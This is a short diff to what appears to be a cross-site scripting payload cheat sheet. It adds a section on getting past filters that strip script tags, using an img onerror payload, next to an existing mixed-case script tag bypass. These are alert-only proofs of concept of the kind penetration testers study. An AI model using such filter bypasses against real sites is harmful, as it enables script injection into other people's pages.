@@ -28,6 +28,7 @@ Cross-site scripting (XSS) is a type of computer security vulnerability typicall
 - [Polyglot XSS](#polyglot-xss)
 - [Filter Bypass and Exotic payloads](#filter-bypass-and-exotic-payloads)
   - [Bypass case sensitive](#bypass-case-sensitive)
+  - [Bypass filter that removes script tag](#bypass-filter-removes-script)
   - [Bypass tag blacklist](#bypass-tag-blacklist)
   - [Bypass word blacklist with code evaluation](#bypass-word-blacklist-with-code-evaluation)
   - [Bypass with incomplete html tag](#bypass-with-incomplete-html-tag)
@@ -543,6 +544,12 @@ javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></
 
 ```javascript
 <sCrIpt>alert(1)</ScRipt>
+```
+
+### Bypass filter that removes script tag
+
+```javascript
+<img src=x onerror=alert('Hello');>
 ```
 
 ### Bypass tag blacklist
